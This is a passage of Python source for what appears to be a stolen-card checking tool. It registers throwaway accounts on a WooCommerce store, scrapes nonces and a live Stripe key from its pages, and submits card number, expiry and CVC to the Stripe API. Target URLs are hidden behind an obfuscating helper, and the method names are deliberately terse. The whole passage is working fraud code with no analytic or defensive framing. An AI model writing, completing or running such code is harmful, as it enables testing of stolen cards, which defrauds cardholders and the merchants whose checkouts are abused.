        d = ["gmail.com","yahoo.com","outlook.com","proton.me"]
        return f"{random.choice(p)}{random.randint(1000,9999)}@{random.choice(d)}"

    def _cc(self):
        n,m,y,c = [x.strip() for x in self.cc.split("|")]
        m = m.zfill(2)
        if len(y)==4: y=y[-2:]
        return n.replace(" ",""),m,y,c

    def g1(self):
        h = self.base.copy()
        h.update({'Cache-Control': "max-age=0", 'Upgrade-Insecure-Requests': "1"})
        r = self.s.get(ConnectionEncryptor.get_url("stripe_account"), headers=h)
        n = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text)
        return n.group(1) if n else None

    def p1(self, email, nonce):
        h = self.base.copy()
        h.update({'Origin': ConnectionEncryptor.get_url("paypal_base"), 'Referer': ConnectionEncryptor.get_url("stripe_account")})
        d = {'email': email, 'woocommerce-register-nonce': nonce, 'register': "Register"}
        self.s.post(ConnectionEncryptor.get_url("stripe_account"), headers=h, data=d)
    def g2(self):
        h = self.base.copy()
        h.update({'Referer': ConnectionEncryptor.get_url("stripe_account"), 'Upgrade-Insecure-Requests': "1"})
        r = self.s.get(ConnectionEncryptor.get_url("stripe_payment"), headers=h)
        t = r.text
        n = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', t)
        k = re.search(r'(pk_live_[a-zA-Z0-9]+)', t)
        return (n.group(1), k.group(1)) if n and k else (None, None)

    def p2(self, n, m, y, c, pk):
        h = {
            'User-Agent': self.ua, 'Accept': "application/json",
            'Origin': "https://js.stripe.com", 'Referer': "https://js.stripe.com/",
        }
        d = {
            'type': "card", 'card[number]': n, 'card[cvc]': c,
            'card[exp_year]': f"20{y}", 'card[exp_month]': m,
            'billing_details[address][postal_code]': "10011",
            'billing_details[address][country]': "US", 'key': pk,
        }
        r = self.s.post(ConnectionEncryptor.get_url("stripe_api"), headers=h, data=d)
        j = r.json()
        return j.get("id"), j

    def p3(self, pm, nonce):
